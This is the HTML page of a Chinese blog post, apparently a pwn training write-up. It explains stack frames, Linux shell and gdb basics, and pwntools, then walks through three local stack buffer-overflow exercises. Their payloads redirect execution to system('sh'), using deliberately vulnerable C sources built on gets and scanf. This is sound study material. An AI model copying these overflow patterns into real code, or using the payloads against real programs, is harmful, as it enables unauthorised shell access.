@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content=":smile:">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="My Touch On IS" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        wp for JULY 7th｜undefined
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2018/07/07/wp-for-JULY-7th/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    My Touch On IS
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="https://i.imgur.com/oXiH18Y.jpg#����Ĭ�ϵ�ͼƬ">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('https://i.imgur.com/oXiH18Y.jpg#����Ĭ�ϵ�ͼƬ')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>wp for JULY 7th</h1>
+                    
+                    <span class="meta">
+                         作者 sitarrr
+                        <span>
+                          日期 2018-07-07
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#pwn"
+                           title="pwn">pwn</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            wp for JULY 7th
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1>栈帧</h1>
+<hr>
+<p>大部分给的定义是过程活动记录，我觉得每个栈帧相当于栈中每个帧，在一个未运行完的函数，每一帧都是一个活动状态，每个栈帧中保存了该函数的返回地址和局部变量。而每个栈帧的共同点是满足栈帧平衡状态。
+<img src="https://i.imgur.com/wVCr1nU.png" alt=""></p>
+<h2>栈帧平衡：</h2>
+<pre><code>PUSH EBP；函数开始（使用EBP前先把已有值保存到栈中）
+</code></pre>
+<p><img src="https://i.imgur.com/dkRXtm5.png" alt=""></p>
+<pre><code>MOV EBP ,ESP；保存当前ESP到EBP中
+</code></pre>
+<p><img src="https://i.imgur.com/BXicckF.png" alt=""></p>
+<pre><code>Xxxxxx；函数体，无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数
+
+MOV ESP EBP；将函数的起始地址返回到ESP中
+</code></pre>
+<p><img src="https://i.imgur.com/Ri16Xvz.png" alt=""></p>
+<pre><code>POP EBP；函数返回前弹出保存在栈中的EBP值
+</code></pre>
+<p><img src="https://i.imgur.com/EhHsM8A.png" alt=""></p>
+<pre><code>RETN；函数终止
+</code></pre>
+<h2>转移指令-CALL指令（“调用”指令）</h2>
+<pre><code>Push retaddr；将下一条指令的所在地址（即当时程序计数器PC的内容）入栈
+Jmp ；跳转至子程序
+</code></pre>
+<h2>转移指令-Ret指令</h2>
+<pre><code>Pop Retaddr；将下一条指令的所在地址出栈
+jmp;跳转
+</code></pre>
+<h1>Linux shell</h1>
+<p>Linux系统的shell作为操作系统的外壳，为用户提供使用操作系统的接口，进而控制系统。</p>
+<h2>cd：（Change Directory）切换工作目录</h2>
+<h3>语法：</h3>
+<pre><code>cd (选项) (参数)
+</code></pre>
+<h3>实例：</h3>
+<pre><code>cd进入用户主目录；
+cd ~  进入用户主目录；
+cd -  返回进入此目录之前所在的目录；
+cd ..  返回上级目录（若当前目录为“/“，则执行完后在“/&quot;；&quot;..&quot;为上级目录的意思）；
+cd ../..  返回上两级目录；
+cd !$  把上个命令的参数作为cd参数使用
+</code></pre>
+<h2>ls(list),显示目标列表</h2>
+<h3>语法：</h3>
+<pre><code>ls（选项）（参数）
+</code></pre>
+<h3>实例</h3>
+<pre><code>ls；显示当前目录下非影藏文件与目录
+
+ls -a；显示当前目录下包括影藏文件在内的所有文件列表
+
+ls -1；输出长格式列表
+
+ls -m；水平输出文件列表
+
+ls -t；修改最后一次编辑的文件，最近修改的文件显示在最上面。
+
+ls -R；显示递归文件
+
+ls -n；打印文件的UID和GID
+
+ls -l；列出文件和文件夹的详细信息
+
+ls -lh；列出可读文件和文件夹详细信息
+
+ls -ld；显示文件夹信息
+
+ls -lt；按时间列出文件和文件夹详细信息
+
+ls -ltr；按修改时间列出文件和文件夹详细信息
+
+ls -F；按照特殊字符对文件进行分类
+
+ls --color=auto；列出文件并标记颜色分类
+</code></pre>
+<h2>chmod ：变更文件或目录的权限</h2>
+<h3>语法</h3>
+<pre><code>chmod(选项)(参数)
+</code></pre>
+<h3>实例</h3>
+<pre><code>r=读取属性　　//值＝4
+w=写入属性　　//值＝2
+x=执行属性　　//值＝1
+
+chmod u+x,g+w f01　　//为文件f01设置自己可以执行，组员可以写入的权限
+chmod u=rwx,g=rw,o=r f01
+chmod 764 f01
+chmod a+x f01　　//对文件f01的u,g,o都设置可执行属性
+</code></pre>
+<h2>objdump:快速查看信息工具</h2>
+<pre><code> -d；disassemble，从objfile中反汇编那些特定指令机器码的section
+</code></pre>
+<h2>gdb：程序调试器</h2>
+<h3>语法</h3>
+<pre><code>gdb(选项)(参数)
+</code></pre>
+<h3>实例：</h3>
+<pre><code>gdb &lt;文件名&gt;；加载被调试的可执行程序文件。因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径
+gdb r；Run，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。
+gdb c；Continue，继续执行被调试程序，直至下一个断点或程序结束	
+gdb b &lt;行号&gt;
+gdb b &lt;函数名称&gt;
+gdb b *&lt;函数名称&gt;
+gdb b *&lt;代码地址&gt; 
+gdb d [编号]；Breakpoint，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。
+gdb s:执行一行源程序代码，如果此行代码中有函数调用，则进入该函数，相当于其它调试器中的“Step Into (单步跟踪进入)”；
+gdb n:执行一行源程序代码，此行代码中的函数调用也一并执行，相当于其它调试器中的“Step Over (单步跟踪)”。
+</code></pre>
+<p><strong>注：s,n这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）</strong></p>
+<pre><code>gdb si;类似s命令
+gdb ni;命令类似于n命令
+gdb p &lt;变量名称&gt;;Print，显示指定变量（临时变量或全局变量）的值
+gdb display;设置程序中断后欲显示的数据及其格式。
+gdb i;info，用于显示各类信息
+gdb q;Quit,退出GDB调试环境.
+gdb help;GDB帮助命令，提供对GDB名种命令的解释说明。
+如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。	
+</code></pre>
+<h1>缓冲区溢出</h1>
+<p>根据栈帧实例中的入栈方式（由低地址-&gt;高地址写入），往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，造成程序崩溃或使程序转而执行其它指令。</p>
+<p><img src="https://i.imgur.com/pCWROhK.png" alt=""></p>
+<p><img src="https://i.imgur.com/yCxD0xr.png" alt=""></p>
+<h2>Ret_slide</h2>
+<p>在不知道返回地址偏移时，通过加载ret指令，形象于在其他任意转移指令滑行，保证最后一个转移指令将到达目标地址即可实现</p>
+<h1>python pwntools</h1>
+<pre><code>send(data): 发送数据
+sendline(data) : 发送一行数据，相当于在末尾加\n  
+recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时
+recvuntil(delims, drop=False) : 接收到delims的pattern
+（以下可以看作until的特例）
+recvline(keepends=True) : 接收到\n，keepends指定保留\n
+recvall() : 接收到EOF
+recvrepeat(timeout=default) : 接收到EOF或timeout
+interactive() : 与shell交互
+</code></pre>
+<h1>p1.exe</h1>
+<hr>
+<h2>源码：</h2>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void cmd()
+{
+	system(&quot;sh&quot;);
+}
+void A()
+{
+	char a[100];
+	scanf(&quot;%s&quot;,a);
+	return;
+}
+int main(){
+	A();
+}
+</code></pre>
+<p>1.linux下打开系统终端</p>
+<p><img src="https://i.imgur.com/q2Ebs9e.png" alt=""></p>
+<p>2.输入<code>cd Desktop</code>,进入桌面，输入objdump -d p1，显示p1文件的反汇编信息</p>
+<p><img src="https://i.imgur.com/xVi4ZkX.png" alt=""></p>
+<p>3.找到cmd函数的地址0x0804846b并保存，</p>
+<p><img src="https://i.imgur.com/WAVu2H0.png" alt=""></p>
+<p>4.输入<code>gdb p1</code>,进入gdb指令窗口</p>
+<p><img src="https://i.imgur.com/GKOAXa2.png" alt=""></p>
+<p>5.输入 <code>start</code>,开始运行程序，根据源代码中只提供100个空间的数组，我们输入<code>pattc 200</code>,随机生成有200个字符的有序字符串，输入<code>c</code>,表示continue，使程序继续运行，直接copy输入生成的字符串，可想我们故意让缓存区溢出后，原本存放ret addr的栈处被其他字符占据，程序运行后返回一个程序运行错误的地址0x41384141，即原本存储ret addr的地址，于是我们在接下来的步骤中只需让该出错地址指向cmd的地址，就可操控命令行</p>
+<p><img src="https://i.imgur.com/nGJlTbi.png" alt=""></p>
+<p>6.输入<code>patto 0x41384141</code>,找到offset的位置112，说明返回指令的地址与输入函数的地址相差112个字节</p>
+<p><img src="https://i.imgur.com/1WuFWgi.png" alt=""></p>
+<p>7.打开终端，进入桌面，进入python交互界面，输入<code>from pwn import *</code>,调用pwn函数，输入<code>p=process(&quot;./p1&quot;)</code>,启用当前目录下的文件p1</p>
+<p><img src="https://i.imgur.com/OmSVgJX.png" alt=""></p>
+<p>8.设置变量<code>a='a'*112</code>,保证数组所在的栈的空间被填满，下一步添加转换至cmd函数的地址，根据小端序的存储原理，再附加地址时要人为先输入高地址的十六进制下的字节<code>a+=&quot;\x6b\x84\x04\x08&quot;</code>,输入<code>p.sendline(a)</code>,将变量a发送给python处理，输入<code>p.interactive()</code>,实现交互</p>
+<p><img src="https://i.imgur.com/GjOEBnk.png" alt=""></p>
+<h1>3-13.exe</h1>
+<hr>
+<h2>源码</h2>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void A()
+{
+setvbuf(stdout, 0, _IONBF, 0);
+	srand(time(0) ^ getpid());
+	char buf[100];
+	int magic = rand();
+	gets(buf);
+	if (atoi(buf) == magic) {
+		puts(&quot;Okay...&quot;);
+		system(&quot;sh&quot;);
+	}
+}
+int main(){
+	A();
+}
+</code></pre>
+<p>1.观察源码发现当buf==magic,才能进入system界面，获取shell,不难发现buf是数组，可以出现缓存区溢出的情况，那么我们只需要控制buf地址上的数与magic地址上的数相等即可，首先可以通过汇编代码中转移指令的原理通过rand()函数和gets()函数找到buf和magic的地址</p>
+<p>2.进入桌面，用gdb指令打开name.exe文件，start，用ni 逐步运行程序，通过rand（）函数找到magic的地址[ebp-0X1C]，通过gets()函数找到buf的首地址[ebp-0X80]，计算两者相差100个字节</p>
+<p><img src="https://i.imgur.com/PRNQZh6.png" alt="">
+<img src="https://i.imgur.com/0DJr72d.png" alt=""></p>
+<p>3.进入Python交互页面，同样的，调用pwn这个库，此次定义a='0'*100+&quot;\x00\x00\x00\x00&quot;,可实现交互</p>
+<p><img src="https://i.imgur.com/BTKpMah.png" alt=""></p>
+<h1>ret slide</h1>
+<hr>
+<p>1.采用p1.exe的源码，根据滑行的原理，我们可以通过不断ret
+到一个函数结尾，只要最后保证能够运行到指向cmd函数的地址即可</p>
+<p>2。前面的步骤与第一体相似，找到cmd地址,随意找到一个ret的地址0x\08048547</p>
+<p><img src="https://i.imgur.com/uihg7ZW.png" alt=""></p>
+<p>3.进入Python交互页面，利用python定义变量a=&quot;\x47\x85\x04\x08&quot;*30+“\x6b\x84\x04\x08&quot;,实现交互</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2018/07/06/wp-for-JULY-6th/" data-toggle="tooltip" data-placement="top"
+                           title="wp for JULY 6th">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+                <!-- 来必力City版安装代码 -->
+                <div id="lv-container" data-id="city" data-uid="sitarrr">
+                    <script type="text/javascript">
+                        (function(d, s) {
+                            var j, e = d.getElementsByTagName(s)[0];
+
+                            if (typeof LivereTower === 'function') { return; }
+
+                            j = d.createElement(s);
+                            j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                            j.async = true;
+
+                            e.parentNode.insertBefore(j, e);
+                        })(document, 'script');
+                    </script>
+                    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+                </div>
+                <!-- City版安装代码已完成 -->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">栈帧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">栈帧平衡：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">转移指令-CALL指令（“调用”指令）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">转移指令-Ret指令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">Linux shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">cd：（Change Directory）切换工作目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">实例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">ls(list),显示目标列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">chmod ：变更文件或目录的权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">objdump:快速查看信息工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">gdb：程序调试器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">实例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">Ret_slide</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">python pwntools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">p1.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">源码：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">3-13.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-text">ret slide</span></a></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#pwn"
+                           title="pwn">pwn</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="http://dx670.github.io">dx670</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/sitarrr">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; My Touch On IS 2018
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="https://i.imgur.com/E2zEHUZ.png">
+</body>
+
+</html>
